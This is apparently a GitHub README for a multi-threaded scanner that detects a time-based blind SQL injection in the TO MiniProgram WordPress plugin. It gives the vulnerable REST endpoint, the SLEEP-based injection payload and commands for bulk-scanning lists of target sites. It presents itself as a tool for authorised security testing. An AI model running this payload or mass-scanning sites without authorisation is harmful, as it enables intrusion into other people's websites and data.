# TO MiniProgram SQLi Scanner

A specialized SQL injection scanner targeting WordPress sites with the TO MiniProgram plugin vulnerable endpoint.

## Features

- 🚀 **High-performance scanning** with multi-threading support
- 🎯 **Accurate detection** of time-based blind SQL injection vulnerabilities
- 📋 **Multiple target support** (single URL or file with URL list)
- 📊 **Clear reporting** with color-coded results
- 💾 **Automatic saving** of vulnerable targets to `vulnerable.txt`

## Installation

1. Clone the repository:
   ```bash
   git clone 
   cd SQLwp
   ```

2. Install required dependencies:
   ```bash
   pip3 install -r requirements.txt
   ```

## Usage

### Basic scan (single target)
```bash
python3 scanner.py -u http://target-site.com -d 5
```

### Bulk scan (from file)
```bash
python3 scanner.py -l targets.txt -t 10 -d 5
```

### Options
| Option | Description | Default |
|--------|-------------|---------|
| `-u`, `--url` | Single target URL | - |
| `-l`, `--list` | File containing list of target URLs | - |
| `-d`, `--delay` | Sleep time for time-based detection (in seconds) | 5 |
| `-t`, `--threads` | Number of concurrent threads | 5 |

## Technical Details

### Vulnerability Tested
The scanner checks for SQL injection in the TO MiniProgram WordPress plugin's endpoint:
```
/wp-json/watch-life-net/v1/comment/getcomments
```

### Payload Used
The scanner sends a time-based blind SQL injection payload:
```sql
DESC,(SELECT(1)FROM(SELECT(SLEEP(5)))a)--
```

### Detection Logic
- The scanner measures response time
- If response time exceeds the specified delay, vulnerability is confirmed

## Ethical Use

⚠️ **This tool is for authorized security testing only.**  
⚠️ **Always obtain proper authorization before scanning any website.**  
⚠️ **The maintainers are not responsible for misuse of this tool.**

## Contribution

Contributions are welcome! Please open an issue or pull request for:
- Bug fixes
- Feature enhancements
- Documentation improvements

## License

This project is licensed under the MIT License - see the file for details.

🔒 **Happy (ethical) hacking!** 🔒
